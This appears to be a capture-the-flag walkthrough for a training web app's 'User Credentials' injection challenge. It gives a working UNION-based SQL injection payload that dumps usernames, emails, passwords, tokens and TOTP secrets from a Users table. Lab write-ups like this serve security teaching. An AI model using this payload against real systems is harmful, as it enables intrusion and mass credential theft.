## User Credentials
**Category:** Injection

**Difficulty:** 4/6

**Challenge Description:** Retrieve a list of all user credentials via SQL Injection.

## Approach

### Prerequisites

It is very helpful to know the database schema at this point, so maybe have a look at [Database Schema](/database-schema.md). At this point we also know already 2 input fields, which are vulnerable.

### SQL Query

The SQL Query is very similar to the one from [Database Schema](/database-schema.md), with the difference, that it retrieves more columns from a different table.

SQL Query: **adesf'))+UNION+SELECT+id,username,email,password,role,deluxeToken,lastLoginIp,totpSecret,isActive+FROM+Users--**

![User Credentials](/images/sqli-all-users.png)